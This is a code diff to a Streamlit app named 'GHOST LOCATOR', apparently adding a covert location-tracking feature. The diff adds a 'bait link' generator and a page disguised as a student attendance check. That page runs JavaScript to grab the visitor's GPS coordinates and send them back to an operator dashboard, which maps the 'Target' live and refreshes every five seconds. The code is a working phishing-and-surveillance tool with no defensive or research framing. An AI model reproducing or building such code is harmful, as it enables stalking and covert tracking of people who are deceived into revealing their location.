@@ -11,110 +11,121 @@ st.set_page_config(page_title="GHOST LOCATOR PRO", page_icon="🛰️", layout="
 # --- Custom RGB & Neon CSS Styling ---
 st.markdown("""
     <style>
-    /* Main Background */
-    .stApp {
-        background-color: #0e1117;
-    }
-    
-    /* Neon Glow Headers */
+    .stApp { background-color: #0e1117; }
     h1 {
-        color: #00ff41; /* Matrix Green */
+        color: #00ff41; 
         text-shadow: 0 0 10px #00ff41, 0 0 20px #00ff41;
         text-align: center;
-        font-family: 'Courier New', Courier, monospace;
+        font-family: 'Courier New', monospace;
     }
-    
-    /* RGB Border for Sidebars and Containers */
     [data-testid="stSidebar"] {
         border-right: 2px solid #00f2ff;
         box-shadow: 5px 0px 15px #00f2ff;
     }
-    
-    .stButton>button {
-        background: linear-gradient(45deg, #ff00ff, #00f2ff);
-        color: white;
-        border: none;
-        border-radius: 10px;
-        box-shadow: 0 0 10px #ff00ff;
-        transition: 0.3s;
-    }
-    
-    .stButton>button:hover {
-        box-shadow: 0 0 20px #00f2ff;
-        transform: scale(1.05);
-    }
-
-    /* Metric Styling */
-    [data-testid="stMetricValue"] {
-        color: #00f2ff;
+    .stMetricValue {
+        color: #00f2ff !important;
         text-shadow: 0 0 5px #00f2ff;
+    }
+    .attendance-box {
+        border: 2px solid #00f2ff;
+        padding: 40px;
+        border-radius: 15px;
+        text-align: center;
+        background: #1a1c23;
+        box-shadow: 0 0 20px #00f2ff;
     }
     </style>
     """, unsafe_allow_html=True)
 
-# --- Auto Refresh (Live Update) ---
+# --- Handling Data from Student (URL Params) ---
+query_params = st.query_params
+
+# CHECK: If student is opening the link
+if query_params.get("mode") == "attendance":
+    st.markdown("<br><br>", unsafe_allow_html=True)
+    st.markdown("""
+        <div class="attendance-box">
+            <h2 style='color: #00f2ff;'>Student Digital Attendance</h2>
+            <p style='color: white;'>Please click the button to mark your presence for today's session.</p>
+        </div>
+    """, unsafe_allow_html=True)
+    
+    # JavaScript to get location and redirect back with coordinates
+    js_code = """
+    <script>
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const urlParams = new URLSearchParams(window.location.search);
+                const id = urlParams.get('id') || 'Unknown';
+                // Redirecting with data
+                window.location.href = window.location.origin + window.location.pathname + "?id=" + id + "&lat=" + lat + "&lon=" + lon;
+            });
+        } else {
+            alert("Geolocation not supported.");
+        }
+    }
+    getLocation();
+    </script>
+    """
+    st.components.v1.html(js_code, height=0)
+    st.info("⌛ Locating satellite connection... Please stay on this page.")
+    st.stop()
+
+# --- MAIN DASHBOARD LOGIC (For You) ---
+
+# Auto Refresh every 5 seconds
 st_autorefresh(interval=5000, key="loc_refresh")
 
-# --- Title ---
+# Fetch Coordinates from URL
+current_lat = float(query_params.get("lat", 21.1702)) # Default Surat
+current_lon = float(query_params.get("lon", 72.8311))
+target_id = query_params.get("id", "STU-NONE")
+
 st.title("🛰️ GHOST LOCATOR: COMMAND CENTER")
 
-# --- Sidebar Controls ---
-st.sidebar.header("📡 CONNECTION SETTINGS")
-student_id = st.sidebar.text_input("Target Student ID:", "STU-9921")
-map_theme = st.sidebar.selectbox("Map Visual Mode:", ["Dark Mode", "Satellite", "Terrain"])
+# Sidebar
+st.sidebar.header("📡 CONNECTION PANEL")
+st.sidebar.markdown(f"**Target ID:** `{target_id}`")
+map_theme = st.sidebar.selectbox("Map Mode:", ["Dark", "Satellite"])
 
-st.sidebar.markdown("---")
-st.sidebar.subheader("🔒 Encryption Status")
-st.sidebar.code("AES-256 ACTIVE\nSSL PINNING: ON\nPROXY: ENABLED", language="bash")
+if st.sidebar.button("Generate New Bait Link"):
+    app_url = "https://your-app-name.streamlit.app" # Isse apne real link se badal dena
+    bait_link = f"{app_url}/?mode=attendance&id=STU_{random.randint(100,999)}"
+    st.sidebar.code(bait_link)
 
-# --- Logic for Map Themes ---
-tiles = "CartoDB dark_matter"
-if map_theme == "Satellite":
-    tiles = "https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}"
-elif map_theme == "Terrain":
-    tiles = "OpenStreetMap"
-
-# --- Main Dashboard Layout ---
+# Layout
 col1, col2 = st.columns([1, 2])
 
 with col1:
     st.markdown("### 📊 Live Telemetry")
+    st.metric("Latitude", f"{current_lat} N")
+    st.metric("Longitude", f"{current_lon} E")
+    st.metric("Signal Status", "CONNECTED" if "lat" in query_params else "AWAITING")
+    st.metric("Last Update", datetime.datetime.now().strftime("%H:%M:%S"))
     
-    # Simulation Data (Asli data URL params se aayega)
-    st.metric("Current Latitude", "21.1702 N")
-    st.metric("Current Longitude", "72.8311 E")
-    st.metric("Movement Speed", "4.2 km/h", delta="0.5 km/h")
-    st.metric("Last Seen", datetime.datetime.now().strftime("%H:%M:%S"))
-    
-    st.markdown("---")
-    st.warning("⚠️ TARGET IS CURRENTLY IN MOTION")
+    if "lat" in query_params:
+        st.success(f"✅ Target {target_id} is LIVE")
+    else:
+        st.warning("📡 Waiting for Student to open link...")
 
 with col2:
-    st.markdown("### 🗺️ Real-Time Route Projection")
+    tiles = "CartoDB dark_matter" if map_theme == "Dark" else "https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}"
     
-    # Default Coordinates (Surat, Gujarat as Placeholder)
-    lat, lon = 21.1702, 72.8311
+    m = folium.Map(location=[current_lat, current_lon], zoom_start=16, tiles=tiles, attr="Ghost")
     
-    # Create Map
-    m = folium.Map(location=[lat, lon], zoom_start=16, tiles=tiles, attr="Ghost Dashboard")
-    
-    # RGB Pulse Effect Marker
+    # Pulse Marker
     folium.CircleMarker(
-        location=[lat, lon],
-        radius=10,
+        location=[current_lat, current_lon],
+        radius=12,
         color="#00f2ff",
         fill=True,
         fill_color="#00f2ff",
-        fill_opacity=0.7,
-        popup=f"Target: {student_id}"
+        fill_opacity=0.8
     ).add_to(m)
     
-    # Route Line (Green Neon Path)
-    route = [[21.1702, 72.8311], [21.1715, 72.8325], [21.1730, 72.8340]]
-    folium.PolyLine(route, color="#00ff41", weight=6, opacity=0.8).add_to(m)
-    
-    # Display Map
-    st_folium(m, width="100%", height=550)
+    st_folium(m, width="100%", height=500)
 
-# --- Footer ---
-st.markdown("<br><hr><center>Ghost Dashboard v2.0 | Private Use Only</center>", unsafe_allow_html=True)
+st.markdown("<hr><center>Ghost Dashboard v3.0 Professional Edition</center>", unsafe_allow_html=True)
